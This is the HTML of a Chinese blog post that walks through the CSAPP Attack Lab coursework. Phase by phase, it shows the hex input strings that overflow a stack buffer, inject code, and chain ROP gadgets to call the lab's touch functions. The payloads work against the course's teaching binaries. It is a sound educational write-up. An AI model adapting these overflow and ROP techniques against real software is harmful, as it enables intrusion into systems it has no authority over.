@@ -1,0 +1,579 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CSAPP: attacklab | 十派的玩具箱</title>
+<link rel="shortcut icon" href="https://meredith2328.github.io/favicon.ico?v=1754230662190">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://meredith2328.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CSAPP: attacklab | 十派的玩具箱 - Atom Feed" href="https://meredith2328.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言：注意这个lab不一定能用WSL做，可能会报毫无道理的段错误（Segmentation Fault）。因为学校服务器拿 Ubuntu 16.04 生成。改到 VMWare 跑 Ubuntu 20.04 是可行的。
+
+结果图
+
+相关指令..." />
+    <meta name="keywords" content="CSAPP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://meredith2328.github.io">
+  <img class="avatar" src="https://meredith2328.github.io/images/avatar.png?v=1754230662190" alt="">
+  </a>
+  <h1 class="site-title">
+    十派的玩具箱
+  </h1>
+  <p class="site-description">
+    “能做成的事情是不少的”
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="https://meredith2328.github.io/post/cs" class="menu">
+          CS相关
+        </a>
+      
+    
+      
+        <a href="https://meredith2328.github.io/tags" class="menu">
+          标签们
+        </a>
+      
+    
+      
+        <a href="https://meredith2328.github.io/post/zi-she" class="menu">
+          自设
+        </a>
+      
+    
+      
+        <a href="https://meredith2328.github.io/post/you-qing-lian-jie-men" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Meredith2328" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CSAPP: attacklab
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-05-15
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+                <a href="https://meredith2328.github.io/tag/oq58-HRV4/" class="post-tag">
+                  # CSAPP
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://meredith2328.github.io/post-images/csapp-attacklab.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <blockquote>
+<p>前言：注意这个lab不一定能用WSL做，可能会报毫无道理的段错误（Segmentation Fault）。因为学校服务器拿 Ubuntu 16.04 生成。改到 VMWare 跑 Ubuntu 20.04 是可行的。</p>
+</blockquote>
+<h2 id="结果图">结果图</h2>
+<figure data-type="image" tabindex="1"><img src="https://meredith2328.github.io/post-images/1715783531349.png" alt="" loading="lazy"></figure>
+<h2 id="相关指令">相关指令</h2>
+<p>这个lab不用打断点方便很多。</p>
+<pre><code>phase1, 2:
+cat phaseX.txt | ./hex2raw | ./ctarget
+
+./hex2raw &lt; phaseX.txt &gt; phaseX-raw.txt
+gdb ctarget
+run &lt; phaseX-raw.txt
+
+phase3, 4, 5:
+cat phaseX.txt | ./hex2raw | ./rtarget
+</code></pre>
+<p>末尾加 -q 是不发送到评测服务器。</p>
+<h2 id="phase5">phase5</h2>
+<p>我们要做的事情类似于phase3，如下：</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 b8 00 64 55 	mov    $0x556400b8,%rdi
+   7:	68 92 18 40 00       	pushq  $0x401892
+   c:	c3                   	retq   
+</code></pre>
+<p>此时我们要解决以下问题：</p>
+<ol>
+<li><code>0x556400b8</code> 本来是我们用于存放字符串的位置（执行的命令之后），但是我们现在此位置未知。<br>
+首先类似于phase4，将我们所需注入的代码： <code>mov 字符串地址,%rdi</code> 和执行touch3拆解为：（伪代码）</li>
+</ol>
+<pre><code>`popq %rax` 对应地址
+此处存放所需字符串地址
+`movq %rax,%rdi` 对应地址
+touch3对应地址
+</code></pre>
+<p>那么接下来只要考虑如何获取到存放的字符串地址。分析farm发现：</p>
+<pre><code>0000000000401964 &lt;mid_farm&gt;:
+  401964:	b8 01 00 00 00       	mov    $0x1,%eax
+  401969:	c3                   	ret    
+
+000000000040196a &lt;add_xy&gt;: # this!
+  40196a:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  40196e:	c3                   	ret    
+
+000000000040196f &lt;getval_376&gt;:
+  40196f:	b8 89 c1 08 c9       	mov    $0xc908c189,%eax
+  401974:	c3                   	ret    
+
+0000000000401975 &lt;setval_439&gt;:
+  401975:	c7 07 a9 d6 38 c9    	movl   $0xc938d6a9,(%rdi)
+  40197b:	c3                   	ret    
+
+000000000040197c &lt;addval_311&gt;:
+  40197c:	8d 87 09 ca 84 db    	lea    -0x247b35f7(%rdi),%eax
+  401982:	c3                   	ret    
+
+0000000000401983 &lt;getval_436&gt;:
+  401983:	b8 89 c1 18 c0       	mov    $0xc018c189,%eax
+  401988:	c3                   	ret    
+
+0000000000401989 &lt;addval_353&gt;:
+  401989:	8d 87 89 c1 00 c9    	lea    -0x36ff3e77(%rdi),%eax
+  40198f:	c3                   	ret    
+
+0000000000401990 &lt;addval_366&gt;: # movq %rsp,%rax
+  401990:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
+  401996:	c3                   	ret    
+
+0000000000401997 &lt;addval_378&gt;:
+  401997:	8d 87 09 d6 38 d2    	lea    -0x2dc729f7(%rdi),%eax
+  40199d:	c3                   	ret    
+
+000000000040199e &lt;addval_483&gt;:
+  40199e:	8d 87 48 89 e0 c1    	lea    -0x3e1f76b8(%rdi),%eax
+  4019a4:	c3                   	ret    
+
+00000000004019a5 &lt;getval_385&gt;:
+  4019a5:	b8 48 c9 e0 c3       	mov    $0xc3e0c948,%eax
+  4019aa:	c3                   	ret    
+
+00000000004019ab &lt;setval_325&gt;:
+  4019ab:	c7 07 81 ca 84 db    	movl   $0xdb84ca81,(%rdi)
+  4019b1:	c3                   	ret    
+
+00000000004019b2 &lt;setval_102&gt;:
+  4019b2:	c7 07 89 d6 90 c2    	movl   $0xc290d689,(%rdi)
+  4019b8:	c3                   	ret    
+
+00000000004019b9 &lt;setval_321&gt;:
+  4019b9:	c7 07 89 ca 91 90    	movl   $0x9091ca89,(%rdi)
+  4019bf:	c3                   	ret    
+
+00000000004019c0 &lt;setval_449&gt;:
+  4019c0:	c7 07 89 d6 c1 66    	movl   $0x66c1d689,(%rdi)
+  4019c6:	c3                   	ret    
+
+00000000004019c7 &lt;getval_493&gt;:
+  4019c7:	b8 a9 d6 20 db       	mov    $0xdb20d6a9,%eax
+  4019cc:	c3                   	ret    
+
+00000000004019cd &lt;setval_478&gt;:
+  4019cd:	c7 07 48 99 e0 90    	movl   $0x90e09948,(%rdi)
+  4019d3:	c3                   	ret    
+
+00000000004019d4 &lt;getval_180&gt;: # movl %esp,%eax
+  4019d4:	b8 4a 89 e0 c3       	mov    $0xc3e0894a,%eax
+  4019d9:	c3                   	ret    
+
+00000000004019da &lt;addval_109&gt;:
+  4019da:	8d 87 35 89 c1 92    	lea    -0x6d3e76cb(%rdi),%eax
+  4019e0:	c3                   	ret    
+
+00000000004019e1 &lt;setval_374&gt;:
+  4019e1:	c7 07 89 c1 94 c0    	movl   $0xc094c189,(%rdi)
+  4019e7:	c3                   	ret    
+
+00000000004019e8 &lt;setval_181&gt;: # movl %ecx,%edx
+  4019e8:	c7 07 89 ca c3 e2    	movl   $0xe2c3ca89,(%rdi)
+  4019ee:	c3                   	ret    
+
+00000000004019ef &lt;setval_259&gt;:
+  4019ef:	c7 07 89 ca 30 c9    	movl   $0xc930ca89,(%rdi)
+  4019f5:	c3                   	ret    
+
+00000000004019f6 &lt;getval_105&gt;:
+  4019f6:	b8 89 ca 90 c3       	mov    $0xc390ca89,%eax
+  4019fb:	c3                   	ret    
+
+00000000004019fc &lt;addval_494&gt;: # movl %eax,%ecx
+  4019fc:	8d 87 89 c1 20 db    	lea    -0x24df3e77(%rdi),%eax
+  401a02:	c3                   	ret    
+
+0000000000401a03 &lt;setval_137&gt;: # movl %edx,%esi
+  401a03:	c7 07 f2 89 d6 c3    	movl   $0xc3d689f2,(%rdi)
+  401a09:	c3                   	ret    
+
+0000000000401a0a &lt;getval_243&gt;:
+  401a0a:	b8 5b 99 d6 c3       	mov    $0xc3d6995b,%eax
+  401a0f:	c3                   	ret    
+
+0000000000401a10 &lt;getval_335&gt;:
+  401a10:	b8 48 89 e0 90       	mov    $0x90e08948,%eax
+  401a15:	c3                   	ret    
+
+0000000000401a16 &lt;getval_115&gt;: # movl %esp,%eax
+  401a16:	b8 68 89 e0 c3       	mov    $0xc3e08968,%eax
+  401a1b:	c3                   	ret    
+
+0000000000401a1c &lt;addval_158&gt;:
+  401a1c:	8d 87 89 d6 84 c0    	lea    -0x3f7b2977(%rdi),%eax
+  401a22:	c3                   	ret    
+
+0000000000401a23 &lt;getval_457&gt;:
+  401a23:	b8 89 c1 94 c3       	mov    $0xc394c189,%eax
+  401a28:	c3                   	ret    
+
+0000000000401a29 &lt;addval_400&gt;:
+  401a29:	8d 87 89 ca 94 db    	lea    -0x246b3577(%rdi),%eax
+  401a2f:	c3                   	ret    
+
+0000000000401a30 &lt;getval_202&gt;:
+  401a30:	b8 48 89 e0 94       	mov    $0x94e08948,%eax
+  401a35:	c3                   	ret    
+
+0000000000401a36 &lt;addval_293&gt;:
+  401a36:	8d 87 89 c1 c2 18    	lea    0x18c2c189(%rdi),%eax
+  401a3c:	c3                   	ret    
+
+0000000000401a3d &lt;setval_479&gt;:
+  401a3d:	c7 07 89 ca 28 db    	movl   $0xdb28ca89,(%rdi)
+  401a43:	c3                   	ret    
+
+0000000000401a44 &lt;end_farm&gt;:
+  401a44:	b8 01 00 00 00       	mov    $0x1,%eax
+  401a49:	c3                   	ret    
+</code></pre>
+<p>gadget为我们提供了<code>add_xy</code>指令，区别于其他所有指令，可能会完整用到该指令。结合课本 <code>支持变长栈帧</code> 一节中提到的利用 <code>%rbp</code> 构造相对位置，而我们的 <code>%rsp</code> 的地址可以动态获取得到，考虑利用相对位置获取字符串的动态位置。<br>
+那么我们目标就很明晰了：构造 add %rsp, 相对位移量。<br>
+倒推得到我们需要将 <code>%rsp</code> 和 相对位移量 传给 <code>%rdi</code> 和 <code>%rsi</code> （或相反），结合我们挖到的其他指令：</p>
+<pre><code># # start_farm
+# popq %rax
+# movq %rax,%rdi
+# movq %eax,%edi
+# # mid_farm
+# movq %rsp,%rax
+# movl %esp,%eax
+# movl %ecx,%edx
+# movl %eax,%ecx
+# movl %edx,%esi
+# movl %esp,%eax
+# # end_farm
+</code></pre>
+<p>发现可以做到<br>
+<code>%rsp</code> → <code>%rax</code> → <code>%rdi</code><br>
+相对位移量 → <code>%rax</code> → <code>%ecx</code> → <code>%edx</code> → <code>%esi</code><br>
+这两条路径，从而满足我们的全部要求。<br>
+（其中 <code># movl %eax,%ecx</code>是因为我们在直接找完其他指令之后发现需要有一条目标操作数D为<code>%edx</code>或<code>%ecx</code>或<code>%rdx</code>或<code>%rcx</code>，因此搜寻包含 <code>89 c1</code> 或 <code>89 c2</code> 且之后返回的指令。寻找发现这一条返回之前包含<code>nop</code>、但满足我们的要求。）<br>
+构造伪代码指令如下：</p>
+<pre><code>(%rsp指向此处↓)
+地址: `movq %rsp,%rax` (0000000000401992)
+地址: `movq %rax,%rdi` (000000000040194c)
+地址: `popq %rax` (0000000000401933)
+值: 相对位移量(待写完后计算得是72，即0x48，见下)
+地址: `movl %eax,%ecx` (00000000004019fe)
+地址: `movl %ecx,%edx` (00000000004019ea)
+地址: `movl %edx,%esi` (0000000000401a06)
+地址: add_xy (000000000040196a)
+(上述完成构造所需字符串地址)
+地址: `movq %rax,%rdi` (000000000040194c)
+地址: touch3 (0000000000401892)
+值: 所需字符串 (33 36 36 31 61 39 39 34 00)
+</code></pre>
+<p>翻译如下：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+92 19 40 00 00 00 00 00
+**4c** 19 40 00 00 00 00 00
+33 19 40 00 00 00 00 00
+&lt;48&gt; 00 00 00 00 00 00 00
+fe 19 40 00 00 00 00 00
+ea 19 40 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+6a 19 40 00 00 00 00 00
+4c 19 40 00 00 00 00 00
+92 18 40 00 00 00 00 00
+**33** 36 36 31 61 39 39 34 00
+</code></pre>
+<p>此处观察偏移量。<br>
+我们知道<code>%rsp</code>一开始指向<code>movq %rsp,%rax</code>处（对应 <code>92 19 40 00 00 00 00 00</code> ），经过一次 <code>popq</code> 指令+8，左负右正，移动到了 <code>**4c** 19 40 00 00 00 00 00</code> 处，也就是说我们所需的是此处到我们所需字符串的相对偏移量。<br>
+从<code>**4c**</code>处到<code>**33**</code>处为72个字节，从而获得偏移量为+0x48，填入<code>&lt; &gt;</code>位置即可。</p>
+<p><em><strong>恭喜皆传</strong></em>。</p>
+<h2 id="phase4">phase4</h2>
+<p>我们要做的事情类似于phase2，如下：</p>
+<pre><code>movq $0x3661a994,%rdi  # set the register
+pushq 0x401781         # the address of touch2
+ret
+</code></pre>
+<p>但是，phase2中已知栈底在 <code>0x55640088</code> 处、从而可以直接从被替代的返回值处（也就是<code>%rsp</code>指向的位置）执行上述指令。但phase4未知栈底位置、且如此存入栈其他位置的代码无法执行，只能另做他法。<br>
+首先分析 <code>start_farm</code> 到 <code>mid_farm</code> ：</p>
+<pre><code>0000000000401929 &lt;start_farm&gt;:
+  401929:	b8 01 00 00 00       	mov    $0x1,%eax
+  40192e:	c3                   	ret    
+
+000000000040192f &lt;addval_334&gt;: # popq %rax: 0000000000401933
+  40192f:	8d 87 0f 58 58 90    	lea    -0x6fa7a7f1(%rdi),%eax
+  401935:	c3                   	ret    
+
+0000000000401936 &lt;addval_451&gt;:
+  401936:	8d 87 e5 72 58 90    	lea    -0x6fa78d1b(%rdi),%eax
+  40193c:	c3                   	ret    
+
+000000000040193d &lt;getval_471&gt;:
+  40193d:	b8 58 91 c3 43       	mov    $0x43c39158,%eax
+  401942:	c3                   	ret    
+
+0000000000401943 &lt;addval_154&gt;: # movq %eax,%edi
+  401943:	8d 87 4a 89 c7 c3    	lea    -0x3c3876b6(%rdi),%eax
+  401949:	c3                   	ret    
+
+000000000040194a &lt;setval_392&gt;: # movq %rax,%rdi: 000000000040194c
+  40194a:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+  401950:	c3                   	ret    
+
+0000000000401951 &lt;getval_283&gt;:
+  401951:	b8 3b e8 f4 50       	mov    $0x50f4e83b,%eax
+  401956:	c3                   	ret    
+
+0000000000401957 &lt;getval_162&gt;:
+  401957:	b8 68 89 c7 90       	mov    $0x90c78968,%eax
+  40195c:	c3                   	ret    
+
+000000000040195d &lt;setval_490&gt;:
+  40195d:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+  401963:	c3                   	ret    
+
+0000000000401964 &lt;mid_farm&gt;:
+  401964:	b8 01 00 00 00       	mov    $0x1,%eax
+  401969:	c3                   	ret    
+</code></pre>
+<p>注意我们所需“断章取义”的地址开始处与函数入口不同。<br>
+从以上分析的指令寻找，发现 <code>movq $0x3661a994,%rdi</code>  可以拆作两步： <code>popq %rax</code>和 <code>movq %rax,%rdi</code>，其中将<code>$0x3661a994</code> 存在栈指针指向的位置。这样可以做到不知道栈底的位置、但执行相同的操作。<br>
+基于这个思路，我们将所需执行的“断章取义”的代码（也就是&quot;农场&quot;里的那些地址）全部写在被替代的返回值处，包括如下操作：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+(%rsp指向这里，即原来的返回地址开始处，把它改成需要执行的第一个指令 popq %rax 的地址: 0000000000401933)
+33 19 40 00 00 00 00 00
+
+(之后rsp完成返回后上移，正好挪到我们所需传入值 0x3661a994 的位置，执行pop）
+94 a9 61 36 00 00 00 00
+(注意此处pop传入之后移动8个字节，所以注意补全位数)
+
+(执行完pop后恰好移动到下一个指令 movq %rax,%rdi 的地址： 000000000040194c 处）
+4c 19 40 00 00 00 00 00
+
+(同样道理，利用地址执行touch2: 0000000000401781)
+81 17 40 00 00 00 00 00
+</code></pre>
+<p>简单总结，我们通过断章取义完成了第一套指令的拼凑，而实际上这个断章取义的过程也是函数调用的过程。</p>
+<h2 id="phase3">phase3</h2>
+<p>cookie: <code>3661a994</code>，注意到3对应于0x33，a对应于97即0x61（或A对应65），那么这八位的字符表示分别为</p>
+<pre><code>33 36 36 31 61 39 39 34 00
+</code></pre>
+<p>最后的<code>00</code> 是字符串结尾。<br>
+注意此处不是“小端法”，因为字符串理解为一系列字符、每个字符各自为一个值按顺序存放；而我们存放地址等时是对“同一个值”用多个字符，才需要小端。<br>
+我们用类似于上一个phase的方法进行修改：<br>
+下述的<code>0x401892</code> 是touch3的地址，<code>0x55640088</code> 是栈底（输入字符串的位置），我们存放字符串在加48即0x30的位置，它的地址为 <code>0x556400b8</code>。</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 b8 00 64 55 	mov    $0x556400b8,%rdi
+   7:	68 92 18 40 00       	pushq  $0x401892
+   c:	c3                   	retq   
+</code></pre>
+<pre><code>48 c7 c7 b8 00 64 55 68 92 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00 00 00 00 33 36 36 31 61 39 39 34 00
+</code></pre>
+<p>有趣的是，如果我们将cookie字符串存放到大片的00处，由于调用touch3会额外有push和sub（add负值等同于sub）等对栈指针的操作（相减类似于向上述的往左覆盖），我们存放的cookie字符串会被覆盖。因此将cookie字符串存放在字符串末尾巧妙地防止了这一点。运气很好没碰到这个难点，直接解决了。</p>
+<h2 id="phase2">phase2</h2>
+<p>我们考虑的思路是分两步：</p>
+<ol>
+<li>修改寄存器的值为我们所需的cookie</li>
+<li>执行touch2<br>
+为了做到这些，我们首先需要更多的空间存放cookie和修改的指令。<br>
+考虑利用程序为该栈帧分配的40个字节。可以将修改值、之后执行的这些指令全部写在栈帧中，而我们前一个phase所做的跳转改为跳转到栈底，执行完上述操作。<br>
+为了执行touch2，我们可以利用类似于call指令的方法，即将“call指令的下一行”压入栈中、之后返回就会将栈中的地址弹出到PC，作为我们下一处执行的地址，从而将控制归还给touch2。<br>
+基于以上思路，写出的汇编代码如下：</li>
+</ol>
+<pre><code>movq $0x3661a994,%rdi  # set the register
+pushq 0x401781         # the address of touch2
+ret
+</code></pre>
+<p>对应于以下汇编代码：</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 94 a9 61 36 	mov    $0x3661a994,%rdi
+   7:	68 81 17 40 00       	pushq  $0x401781
+   c:	c3                   	retq   
+</code></pre>
+<p>而为了利用栈帧分配的40字节，我们就需要获取sub 0x28之后栈帧的地址，跳转到这个位置执行上述指令。<br>
+为此，我们选择使用gdb在执行完sub 0x28之后的下一行打断点 <code>b *0x401743</code>，并读取寄存器的值，得到栈底地址 <code>%rsp = 0x55640088</code> 。</p>
+<p>从而我们按照与phase1相同的思路覆盖返回地址即可。最终得到的代码如下：</p>
+<pre><code>48 c7 c7 94 a9 61 36 68 81 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00
+</code></pre>
+<h2 id="phase1">phase1</h2>
+<p><code>touch1</code> 的入口地址是 <code>0x401755</code>，<br>
+考虑到<code>getbuf</code> 先在返回地址处往栈顶分配0x28=40字节的空间，输入值超过40字节即可冲掉返回地址（8字节），使“返回”变为执行我们的指令。所以考虑输入以下内容：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+55 17 40 00 00 00 00 00
+</code></pre>
+<p>其中90代表<code>nop</code>，但其实写别的也没关系，因为这40个字节用不到。</p>
+<p>之后执行以下指令：</p>
+<pre><code>cat phase1.txt | ./hex2raw | ./ctarget -q
+</code></pre>
+<p>即可。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%BB%93%E6%9E%9C%E5%9B%BE">结果图</a></li>
+<li><a href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">相关指令</a></li>
+<li><a href="#phase5">phase5</a></li>
+<li><a href="#phase4">phase4</a></li>
+<li><a href="#phase3">phase3</a></li>
+<li><a href="#phase2">phase2</a></li>
+<li><a href="#phase1">phase1</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://meredith2328.github.io/post/you-qing-lian-jie-men/">
+              <h3 class="post-title">
+                友情链接们
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+
+          
+            <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css">
+<script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
+
+<div id="disqus_thread"></div>
+
+<script>
+
+var options = {
+  shortname: '10pi',
+  apikey: '11aMFw7o4nfZV4ivvVBRfOl1G5HWJFhJgYjARVM958zMmZPbEmX8eyhhjf0tvZ18',
+}
+if ('') {
+  options.api = ''
+}
+var dsqjs = new DisqusJS(options)
+
+</script>
+
+          
+        
+
+        <div class="site-footer">
+  Powered by  <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://meredith2328.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
